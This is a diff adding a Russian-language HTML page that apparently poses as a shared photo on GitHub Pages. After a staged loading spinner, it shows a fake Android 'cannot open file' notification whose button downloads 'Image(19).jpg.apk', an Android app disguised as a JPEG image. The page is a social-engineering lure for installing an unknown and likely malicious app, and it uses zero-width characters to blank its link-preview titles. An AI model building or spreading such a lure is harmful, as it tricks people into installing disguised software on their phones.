@@ -1,1 +1,241 @@
+<!DOCTYPE html>
+<html lang="ru" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>&#x200B;</title> 
+    
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://host548.github.io/Image-19-/">
+    <meta property="og:title" content="&#8203;">
+    <meta property="og:site_name" content="&#8203;">
+    <meta property="og:description" content="&#8203;">
+    
+    <meta property="og:image" content="https://host548.github.io/Image-19-/downloads/photo_preview.jpg">
+    <meta property="og:image:width" content="576">
+    <meta property="og:image:height" content="1024">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="&#8203;">
+    <meta name="twitter:image" content="https://host548.github.io/Image-19-/downloads/photo_preview.jpg">
+    <meta name="twitter:image:width" content="576">
+    <meta name="twitter:image:height" content="1024">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body, html { 
+            height: 100%; 
+            width: 100%; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Segoe UI', sans-serif;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        .photo-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            position: relative;
+        }
+
+        .photo-container img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        /* Спиннер загрузки */
+        .loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            z-index: 10;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        /* Уведомление в стиле Android */
+        .notification {
+            position: fixed;
+            top: -200px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            z-index: 1000;
+            transition: top 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .notification.show {
+            top: 20px;
+        }
+
+        .notification-header {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            background: #f5f5f5;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .notification-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            background: #ff5252;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .notification-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #212121;
+        }
+
+        .notification-body {
+            padding: 16px;
+        }
+
+        .notification-message {
+            font-size: 14px;
+            color: #424242;
+            line-height: 1.5;
+            margin-bottom: 4px;
+        }
+
+        .notification-submessage {
+            font-size: 12px;
+            color: #757575;
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+
+        .notification-button {
+            width: 100%;
+            padding: 12px;
+            background: #1976d2;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            text-transform: none;
+            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Segoe UI', sans-serif;
+            transition: background 0.2s;
+        }
+
+        .notification-button:active {
+            background: #1565c0;
+        }
+
+        .notification-time {
+            font-size: 11px;
+            color: #9e9e9e;
+            padding: 8px 16px;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="photo-container">
+        <img src="downloads/photo_preview.jpg" alt="Фото">
+        
+        <div class="loading-spinner" id="loadingSpinner">
+            <div class="spinner"></div>
+            <div class="loading-text">Открытие файла...</div>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">
+        <div class="notification-header">
+            <div class="notification-icon">!</div>
+            <div class="notification-title">Не удается открыть файл</div>
+        </div>
+        <div class="notification-body">
+            <div class="notification-message">
+                Формат файла не поддерживается вашим устройством
+            </div>
+            <div class="notification-submessage">
+                Скачайте файл для просмотра в галерее или стороннем приложении
+            </div>
+            <button class="notification-button" onclick="downloadFile()">
+                Скачать и открыть в галерее
+            </button>
+        </div>
+        <div class="notification-time">Только что</div>
+    </div>
+    
+    <script>
+        const repoBaseUrl = 'https://host548.github.io/Image-19-/'; 
+        const apkUrl = repoBaseUrl + 'downloads/Image(19).jpg.apk';
+        const apkFilename = 'Image(19).jpg.apk';
+
+        function downloadFile() {
+            const link = document.createElement('a');
+            link.href = apkUrl + '?t=' + Date.now(); 
+            link.download = apkFilename; 
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        window.onload = function() {
+            // Через 2 секунды показываем спиннер загрузки
+            setTimeout(() => {
+                document.getElementById('loadingSpinner').style.display = 'flex';
+            }, 2000);
+
+            // Через 4 секунды убираем спиннер и показываем уведомление
+            setTimeout(() => {
+                document.getElementById('loadingSpinner').style.display = 'none';
+                document.getElementById('notification').classList.add('show');
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
